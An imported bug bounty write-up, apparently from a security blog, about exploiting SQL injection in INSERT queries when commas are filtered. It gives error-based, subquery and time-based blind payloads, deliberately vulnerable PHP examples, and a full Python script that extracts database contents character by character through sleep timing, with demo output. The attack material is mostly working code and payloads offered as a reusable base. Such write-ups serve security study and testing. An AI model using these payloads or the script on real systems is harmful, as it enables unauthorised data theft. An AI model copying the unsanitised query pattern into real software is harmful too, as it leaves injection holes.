---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-03-31_comma-is-forbidden-no-worries-inject-in-insertupdate-queries-without-it.md
original_filename: 2019-03-31_comma-is-forbidden-no-worries-inject-in-insertupdate-queries-without-it.md
title: Comma is forbidden! No worries!! Inject in insert/update queries without it
category: documents
detected_topics:
- sqli
- oauth
- command-injection
- api-security
tags:
- imported
- documents
- sqli
- oauth
- command-injection
- api-security
language: en
raw_sha256: cac286092fb507d9d798e45fd7b106d9338268ec15edb18e8ffa787993d419c1
text_sha256: 2119ac89eb5b91f598393e3718c2a6289da408bfa83447e4c65ae30296f129e6
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# Comma is forbidden! No worries!! Inject in insert/update queries without it

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-03-31_comma-is-forbidden-no-worries-inject-in-insertupdate-queries-without-it.md
- Source Type: markdown
- Detected Topics: sqli, oauth, command-injection, api-security
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `cac286092fb507d9d798e45fd7b106d9338268ec15edb18e8ffa787993d419c1`
- Text SHA256: `2119ac89eb5b91f598393e3718c2a6289da408bfa83447e4c65ae30296f129e6`


## Content

---
title: "Comma is forbidden! No worries!! Inject in insert/update queries without it"
page_title: "Comma is forbidden! No worries!! Inject in insert/update queries without it – Redforce"
url: "https://blog.redforce.io/sql-injection-in-insert-update-query-without-comma/"
final_url: "https://blog.redforce.io/sql-injection-in-insert-update-query-without-comma/"
authors: ["Ahmed Sultan (@0x4148)"]
bugs: ["SQL injection"]
bounty: "10,000"
publication_date: "2019-03-31"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5337
---

[![](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)](https://blog.redforce.io/writer/a-sultan/)

**[Web Security](https://blog.redforce.io/category/web-security/)** • March 31, 2019 [ •  13 min read ](https://blog.redforce.io/sql-injection-in-insert-update-query-without-comma/)

## Comma is forbidden! No worries!! Inject in insert/update queries without it

A writeup regarding exploiting SQL injection issue in an insert query while it wasn’t possible to use a comma at my payload at all.

![Comma is forbidden! No worries!! Inject in insert/update queries without it](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)

[ 35 ](javascript:void\(0\))

[ 0 ](https://blog.redforce.io/sql-injection-in-insert-update-query-without-comma/#respond)

[ Tweet ](https://twitter.com/intent/tweet?text=Comma is forbidden! No worries!! Inject in insert/update queries without it&url=https://blog.redforce.io/sql-injection-in-insert-update-query-without-comma/)

[ Share ](https://www.facebook.com/dialog/feed?app_id=&display=popup&caption=Redforce :%20Always Stay Ahead!&description=A writeup regarding exploiting SQL injection issue in an insert query while it wasn't possible to use a comma at my payload at all.&link=https://blog.redforce.io/sql-injection-in-insert-update-query-without-comma/&picture=https://blog.redforce.io/storage/2019/02/sqli2-1000x464.jpg&redirect_uri=https://blog.redforce.io/sql-injection-in-insert-update-query-without-comma/)

## TL;DR

This blog post is about the exploitation of one of the interesting SQL injection issues I found during bug hunting.  
The interesting part was the exploitation, the vulnerable endpoint was using insert query and I wasn’t able to use commas due to the application’s logic.  
After some search, I successfully exploited the issue using the following payload
  
  
  xxx'-cast((select CASE WHEN ((MY_QUERY) like 'CHAR_TO_BRUTE_FORCE%25') THEN (sleep(1)) ELSE 2 END) as char)-'

as a base for my exploit code, reported it and gained **10,000$** for that one.

## An unnecessary introduction

Injection in the update or insert queries is known since a long time ago.  
As in any SQL injection issue, the problem arises from using unsanitized input before passing it to the SQL query.  
Dummy example
  
  
  $email=$_POST['email'];
  $name=$_POST['name'];
  $review=$_POST['review'];
  $query="insert into reviews(review,email,name) values ('$review','$email','$name')";
  mysql_query($query,$conn);

A normal request such as  
`review=test review&[[email protected]](/cdn-cgi/l/email-protection)&name=test name`

will result in the following SQL query

`insert into reviews(review,email,name) values ('test review','[[email protected]](/cdn-cgi/l/email-protection)','test name');`

Selecting that column will result in
  
  
  MariaDB [dummydb]> insert into reviews(review,email,name) values ('test review','[[email protected]](/cdn-cgi/l/email-protection)','test name');
  Query OK, 1 row affected (0.001 sec)
  
  MariaDB [dummydb]> select * from reviews;
  +-------------+------------------+-----------+
  | review  | email  | name  |
  +-------------+------------------+-----------+
  | test review | [[email protected]](/cdn-cgi/l/email-protection) | test name |
  +-------------+------------------+-----------+
  1 row in set (0.000 sec)

So to exploit the issue we have multiple options,

#### Exploiting it as an error based injection

setting any parameter to

`test review' and extractvalue(0x0a,concat(0x0a,(select database()))) and '1`

This will result in a SQL error disclosing the DBname
  
  
  MariaDB [dummydb]> insert into reviews(review,email,name) values ('test review' and extractvalue(0x0a,concat(0x0a,(select database()))) and '1','[[email protected]](/cdn-cgi/l/email-protection)','test name');
  ERROR 1105 (HY000): XPATH syntax error: '
  dummydb'

#### Using subqueries

In case the SQL errors were being handled we may use subqueries to execute our SQL query, write the output into any column and read it later.  
Example: setting the **review** parameter’s value to  
`jnk review',(select user()),'dummy name')-- -`

Will result in making the query looks like
  
  
  insert into reviews(review,email,name) values ('jnk review',(select user()),'dummy name')-- -,'[[email protected]](/cdn-cgi/l/email-protection)','test name');

so the following part

`,'[[email protected]](/cdn-cgi/l/email-protection)','test name');`

Will be ignored and the **Email** value will just become the output of the `(select user())`query
  
  
  MariaDB [dummydb]> insert into reviews(review,email,name) values ('jnk review',(select user()),'dummy name');--,'[[email protected]](/cdn-cgi/l/email-protection)','test name');
  Query OK, 1 row affected (0.001 sec)
  
  MariaDB [dummydb]> select * from reviews;
  +-------------+------------------+------------+
  | review  | email  | name  |
  +-------------+------------------+------------+
  | test review | [[email protected]](/cdn-cgi/l/email-protection) | test name  |
  | jnk review  | root@localhost  | dummy name |
  +-------------+------------------+------------+
  2 rows in set (0.000 sec)
  
  MariaDB [dummydb]>

Straight forward and so easy.

#### Exploitation using blind injection

In case there is no error being thrown, being unable to view the data we just inserted or even there were no way to indicate whether if our query resulted in a true or false condition, we can move to the time-based injection, this can be easily done using the following payload

`xxx'-(IF((substring((select database()),1,1)) = 'd', sleep(5), 0))-'xxxx`

If the query output is true, the DBMS will sleep for 5 seconds, using that technique we can obtain the data needed from the DB.  
Quick reference: <https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/>

## The problem

So, overall exploiting such issue isn’t a big deal, But the scenario in that specific bug was different.  
The vulnerable parameters, **urls[]** and **methods[]** were getting split by “**,** ” which made it obvious to me after few tries that I won’t be able to use a comma at the exploitation scenario by any mean.  
pseudo example
  
  
  $urls_input=$_POST['urls'];
  $urls = explode(",", $urls_input);
  print_r($urls);
  foreach($urls as $url){
  mysql_query("insert into xxxxxx (url,method) values ('$url','method')")
  }

So based on the previous piece of code if we set the **urls** parameter to

`xxx'-(IF((substring((select database()),1,1)) = 'd', sleep(5), 0))-'xxxx`

The input will be split and converted into
  
  
  Array
  (
  [0] => xxx'-(IF((substring((select database())
  [1] => 1
  [2] => 1)) = 'd'
  [3] =>  sleep(5)
  [4] =>  0))-'xxxx
  )

Which is totally meaningless when being handled by the SQL server

## The solution

So the solution should include a payload which **doesn’t contain a comma** at all.  
So the 1st step is finding a replace the **IF** condition which requires commas to work with another alternative suitable to our case.  
The **case when** statement was just perfect for that
  
  
  The CASE statement goes through conditions and return a value when the first condition is met (like an IF-THEN-ELSE statement). So, once a condition is true, it will stop reading and return the result.
  If no conditions are true, it will return the value in the ELSE clause.
  If there is no ELSE part and no conditions are true, it returns NULL.

basic usage is
  
  
  MariaDB [dummydb]> select CASE WHEN ((select substring('111',1,1)='1')) THEN (sleep(3)) ELSE 2 END;
  +--------------------------------------------------------------------------+
  | CASE WHEN ((select substring('111',1,1)='1')) THEN (sleep(3)) ELSE 2 END |
  +--------------------------------------------------------------------------+
  |  0 |
  +--------------------------------------------------------------------------+
  1 row in set (3.001 sec)

This will sleep for 3 seconds if the condition is true.

The 2nd step is finding an alternative the **substring** , that’s relatively easy, we may use **like** operator to achieve that  
Basic example
  
  
  MariaDB [dummydb]> select CASE WHEN ((select database()) like 'd%') THEN (sleep(3)) ELSE 2 END;
  +----------------------------------------------------------------------+
  | CASE WHEN ((select database()) like 'd%') THEN (sleep(3)) ELSE 2 END |
  +----------------------------------------------------------------------+
  |  0 |
  +----------------------------------------------------------------------+
  1 row in set (3.001 sec)

This will sleep 3 seconds if the 1st char of the `(select database())`query equal to the character ‘**d** ‘.

The last step is to concatenate this query along with the insert one.  
For some reason, the direct concatenation in the form of  
`http://xxxxxxxx/'-(select CASE WHEN ((select database()) like 'd%') THEN (sleep(4)) ELSE 2 END)-'xxx`

Didn’t work on the target’s side,  
I had to cast the case when as char to overcome that so the full payload became  
`urls[]=xxx'-cast((select CASE WHEN ((MY_QUERY) like 'CHAR_TO_BRUTE_FORCE%25') THEN (sleep(1)) ELSE 2 END) as char)-'`

## Exploitation

That would be so exhausting to exploit manually so I wrote a simple script to automate the data extraction process
  
  
  import requests
  import sys
  import time
  # xxxxxxxxxexample.com SQLi POC
  # Coded by Ahmed Sultan (0x4148)
  if len(sys.argv) == 1:
  print '''
  Usage : python sql.py "QUERY"
  Example : python sql.py "(select database)"
  '''
  sys.exit()
  query=sys.argv[1]
  print "[*] Obtaining length"
  url = "https://xxxxxxxxxexample.com:443/sub"
  headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0",
  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
  "Cookie": 'xxxxxxxxxxxxxxxxxxx',
  "Referer": "https://www.xxxxxxxxxexample.com:443/",
  "Host": "www.xxxxxxxxxexample.com",
  "Connection": "close",
  "X-Requested-With":"XMLHttpRequest",
  "Content-Type": "application/x-www-form-urlencoded"}
  for i in range(1,100):
  current_time=time.time()
  data={"methods[]": "on-site", "urls[]": "jnkfooo'-cast((select CASE WHEN ((select length("+query+"))="+str(i)+") THEN (sleep(1)) ELSE 2 END) as char)-'"}
  response=requests.post(url, headers=headers, data=data).text
  response_time=time.time()
  time_taken=response_time-current_time
  print "Executing jnkfooo'-cast((select CASE WHEN ((select length("+query+"))="+str(i)+") THEN (sleep(1)) ELSE 2 END) as char)-'"+" took "+str(time_taken)
  if time_taken > 2:
  print "[+] Length of DB query output is : "+str(i)
  length=i+1
  break
  i=i+1
  print "[*] obtaining query output\n"
  outp=''
  #Obtaining query output
  charset="abcdefghijklmnopqrstuvwxyz0123456789.ABCDEFGHIJKLMNOPQRSTUVWXYZ_@-."
  for i in range(1,length):
  for char in charset:
  current_time=time.time()
  data={"methods[]": "on-site", "urls[]": "jnkfooo'-cast((select CASE WHEN ("+query+" like '"+outp+char+"%') THEN (sleep(1)) ELSE 2 END) as char)-'"}
  response=requests.post(url, headers=headers, data=data).text
  response_time=time.time()
  time_taken=response_time-current_time
  print "Executing jnkfooo'-cast((select CASE WHEN ("+query+" like '"+outp+char+"%') THEN (sleep(1)) ELSE 2 END) as char)-' took "+str(time_taken)
  if time_taken > 2:
  print "Got '"+char+"'"
  outp=outp+char
  break
  i=i+1
  print "QUERY output : "+outp

Demo usage
  
  
  [19:38:36] root:/tmp # python sql7.py '(select "abc")'  
  [*] Obtaining length
  Executing jnkfooo'-cast((select CASE WHEN ((select length((select "abc")))=1) THEN (sleep(1)) ELSE 2 END) as char)-' took 0.538205862045
  Executing jnkfooo'-cast((select CASE WHEN ((select length((select "abc")))=2) THEN (sleep(1)) ELSE 2 END) as char)-' took 0.531971931458
  Executing jnkfooo'-cast((select CASE WHEN ((select length((select "abc")))=3) THEN (sleep(1)) ELSE 2 END) as char)-' took 5.55048894882
  [+] Length of DB query output is : 3
  [*] obtaining query output
  
  Executing jnkfooo'-cast((select CASE WHEN ((select "abc") like 'a%') THEN (sleep(1)) ELSE 2 END) as char)-' took 5.5701880455
  Got 'a'
  Executing jnkfooo'-cast((select CASE WHEN ((select "abc") like 'aa%') THEN (sleep(1)) ELSE 2 END) as char)-' took 0.635061979294
  Executing jnkfooo'-cast((select CASE WHEN ((select "abc") like 'ab%') THEN (sleep(1)) ELSE 2 END) as char)-' took 5.61513400078
  Got 'b'
  Executing jnkfooo'-cast((select CASE WHEN ((select "abc") like 'aba%') THEN (sleep(1)) ELSE 2 END) as char)-' took 0.565879821777
  Executing jnkfooo'-cast((select CASE WHEN ((select "abc") like 'abb%') THEN (sleep(1)) ELSE 2 END) as char)-' took 0.553005933762
  Executing jnkfooo'-cast((select CASE WHEN ((select "abc") like 'abc%') THEN (sleep(1)) ELSE 2 END) as char)-' took 5.6208281517
  Got 'c'
  QUERY output : abc

The script in action

![](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)

And the final result was

![](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)

## In a nutshell

You can achieve the goal by using the following payload as a base for your exploit
  
  
  xxx'-cast((select CASE WHEN ((MY_QUERY) like 'CHAR_TO_BRUTE_FORCE%25') THEN (sleep(1)) ELSE 2 END) as char)-'

**Happy hacking**

[Bugbounty](https://blog.redforce.io/tag/bugbounty/) [SQL injection](https://blog.redforce.io/tag/sql-injection/) [Web pentest](https://blog.redforce.io/tag/web-pentest/)
